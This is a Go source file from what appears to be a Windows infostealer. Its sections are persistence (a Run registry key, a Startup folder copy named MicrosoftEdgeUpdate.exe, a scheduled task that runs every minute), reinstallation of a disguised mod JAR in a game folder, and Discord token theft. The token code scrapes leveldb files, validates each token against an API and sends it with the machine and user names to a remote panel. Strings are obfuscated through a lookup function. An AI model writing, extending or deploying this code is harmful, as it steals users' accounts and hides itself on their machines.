// ==================== PERSISTENCE ====================

func gSP() string {
	return filepath.Join(os.Getenv(g(40)), g(70))
}

func gIP() string {
	return filepath.Join(gSP(), g(71))
}

func cSTSL() error {
	ce, err := os.Executable()
	if err != nil {
		return err
	}
	ce, _ = filepath.EvalSymlinks(ce)

	sp := gSP()
	ip := gIP()

	os.MkdirAll(sp, 0755)
	sH(sp)
	sSH(sp)

	ci, _ := os.Stat(ce)
	ii, err := os.Stat(ip)
	if err == nil && ci.Size() == ii.Size() {
		return nil
	}

	src, err := os.Open(ce)
	if err != nil {
		return err
	}
	defer src.Close()

	dst, err := os.Create(ip)
	if err != nil {
		return err
	}
	defer dst.Close()

	io.Copy(dst, src)
	sH(ip)
	return nil
}

func aRP() {
	ip := gIP()
	aRK(registry.CURRENT_USER, g(72), g(73), ip)
}

func aRK(root registry.Key, kp, vn, ep string) {
	key, err := registry.OpenKey(root, kp, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		key, _, err = registry.CreateKey(root, kp, registry.SET_VALUE)
		if err != nil {
			return
		}
	}
	defer key.Close()
	key.SetStringValue(vn, ep)
}

func eP() {
	defer func() { recover() }()
	
	// 1. Registry Persistence (Run Key) - HKCU (No Admin)
	func() { defer func() { recover() }(); cSTSL() }()
	func() { defer func() { recover() }(); aRP() }()
	
	// 2. Startup Folder Persistence (No Admin)
	func() { defer func() { recover() }(); cSTSF() }()
	
	// 3. Scheduled Task Persistence (User Level)
	func() { defer func() { recover() }(); aSTP() }()
}

// Copy to Startup Folder
func cSTSF() {
	ce, err := os.Executable()
	if err != nil {
		return
	}
	ce, _ = filepath.EvalSymlinks(ce)
	
	ap := os.Getenv(g(41)) // APPDATA
	if ap == "" {
		return
	}
	
	sp := filepath.Join(ap, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if _, err := os.Stat(sp); os.IsNotExist(err) {
		return
	}
	
	dp := filepath.Join(sp, "MicrosoftEdgeUpdate.exe")
	
	// Check if already exists
	ci, _ := os.Stat(ce)
	di, err := os.Stat(dp)
	if err == nil && ci.Size() == di.Size() {
		return
	}
	
	// Copy
	src, err := os.Open(ce)
	if err != nil {
		return
	}
	defer src.Close()
	
	dst, err := os.Create(dp)
	if err != nil {
		return
	}
	defer dst.Close()
	
	io.Copy(dst, src)
	sH(dp) // Hide it
}

// Add Scheduled Task Persistence (User Level Only)
func aSTP() {
	ip := gIP() // Installed path
	if _, err := os.Stat(ip); os.IsNotExist(err) {
		return
	}
	
	// Create task that runs every minute, for the current user only (no password needed usually for current user)
	// /IT = Interactive (runs only when user is logged on)
	// /F = Force
	cmd := exec.Command("schtasks", "/create", "/sc", "minute", "/mo", "1", 
		"/tn", "MicrosoftEdgeUpdateTask", "/tr", ip, "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

// ==================== MOD FOLDER FUNCTIONS ====================

func gCP() string {
	la := os.Getenv(g(40))
	if la == "" {
		la = os.Getenv(g(41))
	}
	return filepath.Join(la, "Microsoft\\EdgeUpdate\\Cache")
}

func dE(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.IsDir()
}

func fAMF() []string {
	var f []string
	ad := os.Getenv(g(41))

	if p := filepath.Join(ad, g(43), g(44)); dE(p) {
		f = append(f, p)
	}

	return f
}

func iOM(jp string) bool {
	r, err := zip.OpenReader(jp)
	if err != nil {
		return false
	}
	defer r.Close()

	for _, file := range r.File {
		if file.Name == g(48) || strings.HasSuffix(file.Name, "/"+g(48)) {
			return true
		}
	}
	return false
}

func gCF(cp, mf string) string {
	h := make([]byte, 8)
	hash := uint64(0)
	for _, c := range mf {
		hash = hash*31 + uint64(c)
	}
	for i := 0; i < 8; i++ {
		h[i] = byte(hash >> (i * 8))
	}
	return filepath.Join(cp, hex.EncodeToString(h)+".cache")
}

func cM(jp, cf string) error {
	src, err := os.Open(jp)
	if err != nil {
		return err
	}
	defer src.Close()

	dst, err := os.Create(cf)
	if err != nil {
		return err
	}
	defer dst.Close()

	io.Copy(dst, src)
	sH(cf)
	return nil
}

func fOM(mf string) (string, bool) {
	es, err := os.ReadDir(mf)
	if err != nil {
		return "", false
	}
	for _, e := range es {
		if !e.IsDir() && strings.HasSuffix(strings.ToLower(e.Name()), g(49)) {
			jp := filepath.Join(mf, e.Name())
			if iOM(jp) {
				return jp, true
			}
		}
	}
	return "", false
}

func rM(cf, mf string) error {
	src, err := os.Open(cf)
	if err != nil {
		return err
	}
	defer src.Close()

	rb := make([]byte, 4)
	rand.Read(rb)
	mn := fmt.Sprintf("performance-mod-%d.jar", mrand.Intn(1000))
	dp := filepath.Join(mf, mn)

	dst, err := os.Create(dp)
	if err != nil {
		return err
	}
	defer dst.Close()

	io.Copy(dst, src)
	return nil
}

func cAR(mf, cp string) {
	cf := gCF(cp, mf)
	mp, found := fOM(mf)

	if found {
		if _, err := os.Stat(cf); os.IsNotExist(err) {
			cM(mp, cf)
		}
	} else {
		if _, err := os.Stat(cf); err == nil {
			rM(cf, mf)
		}
	}
}

// ==================== DISCORD STEALING ====================

var tokenRegex = regexp.MustCompile(`[\w-]{24,}\.[\w-]{6,}\.[\w-]{25,110}`)
var mfaRegex = regexp.MustCompile(`mfa\.[\w-]{80,95}`)

func sD() {
	defer func() { recover() }()

	tokens := make(map[string]bool)
	ad := os.Getenv(g(41))
	la := os.Getenv(g(40))

	if ad == "" || la == "" {
		return
	}

	dps := []string{
		filepath.Join(ad, g(50), g(53), g(54)),
		filepath.Join(ad, g(51), g(53), g(54)),
		filepath.Join(ad, g(52), g(53), g(54)),
	}

	for _, dp := range dps {
		func() {
			defer func() { recover() }()
			for t := range eTFP(dp) {
				if t != "" {
					tokens[t] = true
				}
			}
		}()
	}

	bps := []string{g(60), g(61), g(62)}
	pfs := []string{g(63)}

	for _, bp := range bps {
		for _, pf := range pfs {
			func() {
				defer func() { recover() }()
				lp := filepath.Join(la, bp, pf, g(53), g(54))
				for t := range eTFP(lp) {
					if t != "" {
						tokens[t] = true
					}
				}
			}()
		}
	}

	for t := range tokens {
		func() {
			defer func() { recover() }()
			if t != "" {
				if vi := vT(t); vi != "" {
					sTV(t, vi)
				}
			}
		}()
	}
}

func eTFP(path string) map[string]bool {
	defer func() { recover() }()

	tokens := make(map[string]bool)
	if path == "" {
		return tokens
	}

	dir, err := os.ReadDir(path)
	if err != nil {
		return tokens
	}

	for _, f := range dir {
		func() {
			defer func() { recover() }()

			fn := f.Name()
			if !strings.HasSuffix(fn, g(55)) && !strings.HasSuffix(fn, g(56)) {
				return
			}

			data, err := os.ReadFile(filepath.Join(path, fn))
			if err != nil || len(data) == 0 {
				return
			}

			for _, m := range tokenRegex.FindAllString(string(data), -1) {
				if m != "" && iVTF(m) {
					tokens[m] = true
				}
			}
			for _, m := range mfaRegex.FindAllString(string(data), -1) {
				if m != "" {
					tokens[m] = true
				}
			}
		}()
	}
	return tokens
}

func iVTF(t string) bool {
	defer func() { recover() }()

	if t == "" || len(t) < 50 {
		return false
	}
	parts := strings.Split(t, ".")
	if len(parts) != 3 || parts[0] == "" {
		return false
	}
	decoded, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return false
	}
	for _, c := range decoded {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

func vT(t string) string {
	defer func() { recover() }()

	if t == "" {
		return ""
	}

	client := &http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest("GET", g(80), nil)
	if err != nil {
		return ""
	}
	req.Header.Set(g(81), t)

	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return ""
	}

	body, _ := io.ReadAll(resp.Body)
	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return ""
	}

	un, _ := data[g(83)].(string) // Swapped indices in original code? 82=username, 83=id
	id, _ := data[g(82)].(string)
	return fmt.Sprintf("%s (%s)", un, id)
}



// Process Manager Functions
func listProcessesJSON() string {
	defer func() { recover() }()
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("tasklist", "/FO", "CSV", "/NH")
	} else {
		cmd = exec.Command("ps", "-e", "-o", "pid,comm")
	}
	
	// Hide window
	if runtime.GOOS == "windows" {
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	}
	
	output, err := cmd.Output()
	if err != nil {
		return `{"error":"Failed to list processes"}`
	}
	
	lines := strings.Split(string(output), "\n")
	var processes []map[string]string
	
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" { continue }
		
		if runtime.GOOS == "windows" {
			// "Image Name","PID",...
			parts := strings.Split(line, "\",\"")
			if len(parts) >= 2 {
				name := strings.Trim(parts[0], "\"")
				pid := strings.Trim(parts[1], "\"")
				processes = append(processes, map[string]string{"pid": pid, "name": name})
			}
		} else {
			// PID COMMAND
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				pid := parts[0]
				name := parts[1]
				processes = append(processes, map[string]string{"pid": pid, "name": name})
			}
		}
	}
	
	jsonBytes, err := json.Marshal(map[string]interface{}{"processes": processes})
	if err != nil {
		return `{"error":"JSON error"}`
	}
	return string(jsonBytes)
}

func killProcess(pid string) string {
	defer func() { recover() }()
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("taskkill", "/F", "/PID", pid)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("kill", "-9", pid)
	}
	
	if err := cmd.Run(); err != nil {
		return "Failed to kill process " + pid
	}
	return "Process " + pid + " killed"
}

func sTV(token, info string) {
	defer func() { recover() }()

	if token == "" {
		return
	}

	payload := fmt.Sprintf(`{"%s":"%s","%s":"%s","%s":"%s","%s":"%s"}`,
		g(110), g(111),
		g(112), token,
		g(113), pcName,
		g(114), pcUser)

	var resp *http.Response
	for retry := 0; retry < 3; retry++ {
		func() {
			defer func() { recover() }()
			client := &http.Client{Timeout: 15 * time.Second}
			req, _ := http.NewRequest("POST", getPanelURL(), strings.NewReader(payload))
			req.Header.Set(g(116), g(115))
			resp, _ = client.Do(req)
		}()
		if resp != nil {
			break
		}
		time.Sleep(2 * time.Second)
	}
	if resp != nil {
		resp.Body.Close()
	}
}

// Suppress unused
var _ = bytes.Buffer{}
var _ = base64.StdEncoding
var _ = json.Marshal
var _ = http.Get
var _ = regexp.Match
var _ = fmt.Sprintf
var _ = runtime.GOOS


